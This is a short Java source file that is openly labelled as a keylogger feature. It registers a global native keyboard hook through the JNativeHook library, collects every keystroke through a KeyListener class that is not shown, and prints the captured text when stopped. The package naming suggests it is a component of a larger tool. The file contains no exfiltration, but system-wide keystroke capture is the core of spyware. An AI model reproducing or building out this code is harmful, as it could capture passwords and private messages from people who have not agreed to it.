package features.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class KeyLog {
    KeyListener KL;

    public void start(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
        KL = new KeyListener();
        GlobalScreen.addNativeKeyListener(KL);
    }
    public void end(){
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
        System.out.println(KL.getText());
    }
}
